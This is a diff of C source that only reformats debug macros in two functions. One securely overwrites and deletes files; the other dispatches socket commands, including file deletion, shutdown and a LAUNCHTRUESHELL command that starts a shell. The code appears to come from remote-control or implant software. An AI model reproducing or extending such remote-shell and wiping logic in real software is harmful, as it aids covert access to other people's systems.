@@ -337,14 +337,14 @@ int SecureDelete( char *path )
 	//check to see if file opened
 	if(fd == 0)
 	{
-		D( perror( "fopen()" ); )
+		D(perror( "fopen()"));
 		return errno;
 	}
 
 	// Get file size
 	if( _fstat(fileno(fd),&buf) != 0)
 	{
-		D( perror( "fstat()" ); )
+		D(perror( "fstat()"));
 		goto Error;
 	}
 	fsize = buf.st_size;
@@ -367,7 +367,7 @@ int SecureDelete( char *path )
 		numWritten = fwrite( zerobuf, 1, MIN( 4096, remaining) ,fd);
 		if(numWritten <= 0)
 		{
-			D( perror( "fwrite()");)
+			D(perror( "fwrite()"));
 			goto Error;
 		}
 		remaining -= numWritten;
@@ -513,6 +513,7 @@ unsigned long StartClientSession( int sock )
 						ret.reply = DelFile(commandpath);
 				}
 				break;
+
 	//TODO: The following code (from here through the exit) needs to be reviewed.
 			case SHUTDOWNBOTH:
 				DLX(2, printf("SHUTDOWN command received.\n"));
@@ -531,9 +532,8 @@ unsigned long StartClientSession( int sock )
 #endif
 
 			case LAUNCHTRUESHELL:
-				DLX(2, printf("LAUNCHTRUESHELL command received.\n"));
 				ret.reply = launchShell(commandpath);
-				D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
+				DLX(2, printf("LAUNCHTRUESHELL command received, returned: %i\n", (int)ret.reply));
 				break;
 
 			default:
